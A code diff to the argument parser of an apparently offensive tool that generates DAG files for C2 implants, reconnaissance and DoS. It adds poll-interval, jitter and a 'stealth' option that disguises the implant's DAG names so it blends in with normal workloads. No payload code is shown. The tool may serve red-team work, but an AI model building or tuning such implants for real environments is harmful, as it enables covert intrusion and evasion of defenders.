@@ -141,6 +141,13 @@ def build_parser() -> argparse.ArgumentParser:
                          help="Comma-separated target accounts (for recon DAG)")
     dag_gen.add_argument("--dos-target-account", default=None, help="DoS target account ID")
     dag_gen.add_argument("--dos-target-queue", default=None, help="DoS target queue name")
+    # C2 DAG options
+    dag_gen.add_argument("--c2-poll-interval", type=int, default=5,
+                         help="C2 implant poll interval in minutes (default: 5)")
+    dag_gen.add_argument("--c2-jitter", type=int, default=30,
+                         help="Max random jitter in seconds added per poll cycle (default: 30)")
+    dag_gen.add_argument("--c2-stealth", action="store_true",
+                         help="Use innocuous DAG name/tags to blend with normal workloads")
 
     dag_upload = dag_sub.add_parser("upload", help="Upload a DAG file to S3")
     dag_upload.add_argument("--file", required=True, help="Local DAG file path")
@@ -439,6 +446,9 @@ def main():
             if args.type in ("c2", "all"):
                 dag_generator.generate_c2_implant_dag(
                     attacker,
+                    poll_interval_minutes=args.c2_poll_interval,
+                    jitter_seconds=args.c2_jitter,
+                    stealth=args.c2_stealth,
                     output_path=os.path.join(output_dir, "dag_c2_implant.py"),
                 )
             if args.type in ("recon", "all"):
